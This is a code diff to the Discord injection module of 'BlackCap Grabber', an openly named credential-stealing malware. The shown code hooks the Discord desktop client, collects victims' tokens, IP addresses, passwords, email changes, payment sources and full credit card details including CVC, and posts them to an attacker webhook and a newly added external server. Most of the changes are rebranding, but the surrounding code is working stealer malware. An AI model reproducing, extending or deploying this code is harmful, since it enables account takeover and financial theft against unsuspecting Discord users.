@@ -29,7 +29,7 @@ const config = {
 
     injection_url: "https://raw.githubusercontent.com/DamsDev1/InjectD/master/index.js",
     webhook: "%WEBHOOK%",
-    // apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
+    UWUWED: "https://login.blackcap-grabber.com:3000/premium/",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -75,6 +75,7 @@ function updateCheck() {
     const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+    //if(config.nume_core === "%num_core_discord%")return;
     if(app === 'Lightcord')return;
     if(app === 'DiscordCanary')return;
     if(app === 'DiscordPTB')return;
@@ -220,7 +221,7 @@ async function post(url, embed){
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(config.apiurl)) {
+    if (details.url.startsWith(config.UWUWED)) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
@@ -267,9 +268,10 @@ async function FirstTime() {
                 if (token == null || token == undefined || token == "") {
                     var {
                         ip
-                    } = await getFromURL("https://www.myexternalip.com/json", null)
+                    } = await getIP()
                     const c = {
-                        username: "BlackCap",
+                        username: "BlackCap Grabber",
+                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                         content: "",
                         embeds: [{
                             title: "BlackCap Initalized",
@@ -283,20 +285,19 @@ async function FirstTime() {
                                 name: "BlackCap"
                             },
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "©KSCH | https://github.com/KSCHdsc"
                             }
 						}]
                     };
                     let data = JSON.stringify(c);
                     let UwU = JSON.stringify({ data: data, token: token })
-                    post(config.apiurl, UwU);
                     hooker(c)
 
                 } else {
                     var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                     var {
                         ip
-                    } = await getFromURL("https://www.myexternalip.com/json", null)
+                    } = await getIP()
                     
                     if(b.avatar === null){
                         usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
@@ -305,7 +306,8 @@ async function FirstTime() {
                         bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "BlackCap",
+                        username: "BlackCap Grabber",
+                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                         content: "",
                         embeds: [{
                             title: "BlackCap Initalized",
@@ -350,7 +352,7 @@ async function FirstTime() {
 								}],
 
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "©KSCH | https://github.com/KSCHdsc"
                             },
                             image: {
                                 url: bannerurl,
@@ -379,9 +381,10 @@ async function FirstTime() {
                         if (token == null || token == undefined || token == "") {
                             var {
                                 ip
-                            } = await getFromURL("https://www.myexternalip.com/json", null)
+                            } = await getIP()
                             const c = {
                                 username: "BlackCap Grabber",
+                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                                 content: "",
                                 embeds: [{
                                     title: "BlackCaped User log out (User not Logged in before)",
@@ -395,7 +398,7 @@ async function FirstTime() {
                                         name: "BlackCap"
                                     },
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "©KSCH | https://github.com/KSCHdsc"
                                     }
 						}]
                             };
@@ -408,7 +411,7 @@ async function FirstTime() {
                             var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                             var {
                                 ip
-                            } = await getFromURL("https://www.myexternalip.com/json", null)
+                            } = await getIP()
                             if(b.avatar === null){
                                 usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
                             }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
@@ -417,6 +420,7 @@ async function FirstTime() {
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
                                 username: "BlackCap Grabber",
+                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                                 content: "",
                                 embeds: [{
                                     title: "BlackCap Victim got logged out",
@@ -457,7 +461,7 @@ async function FirstTime() {
 								}],
 
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "©KSCH | https://github.com/KSCHdsc"
                                     },
                                     image: {
                                         url: bannerurl,
@@ -488,9 +492,15 @@ async function FirstTime() {
 const Filter = {
     "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
 }
-
-
-
+async function getIP() {
+    const window = BrowserWindow.getAllWindows()[0];
+    var b = await window.webContents.executeJavaScript(`
+var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/json", false );
+        xmlHttp.send( null );
+        JSON.parse(xmlHttp.responseText);`, !0)
+        return b
+}
 
 
 async function getFromURL(url, token) {
@@ -769,7 +779,7 @@ async function Login(email, password, token) {
     var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
     var {
         ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
+    } = await getIP()
     window.webContents.executeJavaScript(`
         var xmlHttp = new XMLHttpRequest();
         xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
@@ -836,6 +846,7 @@ async function Login(email, password, token) {
             
             const params = {
                 username: "BlackCap Grabber",
+                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                 content: "",
                 embeds: [{
                     "title": "BlackCap User Login",
@@ -896,7 +907,7 @@ async function Login(email, password, token) {
 												}, ],
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
@@ -907,7 +918,7 @@ async function Login(email, password, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -933,7 +944,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
     var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
     var {
         ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
+    } = await getIP()
     window.webContents.executeJavaScript(`
         var xmlHttp = new XMLHttpRequest();
         xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
@@ -995,6 +1006,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
             let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
             const params = {
                 username: "BlackCap Grabber",
+                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                 content: "",
                 embeds: [{
                     "title": "BlackCap Detect Password Changed",
@@ -1059,7 +1071,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
 												}, ],
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
@@ -1070,7 +1082,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -1081,8 +1093,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
 											}]
             }
             let data = JSON.stringify(params);
-            let UwU = JSON.stringify({ data: data, token: token })
-            
+            let UwU = JSON.stringify({ data: data, token: token })            
             hooker(params)
         })
     })
@@ -1093,7 +1104,7 @@ async function ChangeEmail(newemail, password, token) {
     var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
     var {
         ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
+    } = await getIP()
     window.webContents.executeJavaScript(`
         var xmlHttp = new XMLHttpRequest();
         xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
@@ -1162,6 +1173,7 @@ async function ChangeEmail(newemail, password, token) {
             
            const params = {
                 username: "BlackCap Grabber",
+                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                 content: "",
                 embeds: [{
                         "title": "BlackCap Detect Email Changed",
@@ -1223,7 +1235,7 @@ async function ChangeEmail(newemail, password, token) {
 				],
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "©KSCH | https://github.com/KSCHdsc"
                         },
                         "thumbnail": {
                             "url": `${usericonurl}`
@@ -1234,7 +1246,7 @@ async function ChangeEmail(newemail, password, token) {
                         "description": CalcFriends(),
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "©KSCH | https://github.com/KSCHdsc"
                         },
                         "image": {
                             'url': `${bannerurl}`,
@@ -1260,7 +1272,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
     var {
         ip
-    } = await getFromURL("https://www.myexternalip.com/json", null)
+    } = await getIP()
         if(info.avatar === null){
             usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
@@ -1271,6 +1283,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         
         const params = {
             username: "BlackCap Grabber",
+            avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
             content: "",
             embeds: [{
                     "title": "BlackCap User Credit Card Added",
@@ -1292,7 +1305,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "name": "BlackCap"
                     },
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
@@ -1304,7 +1317,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "©KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
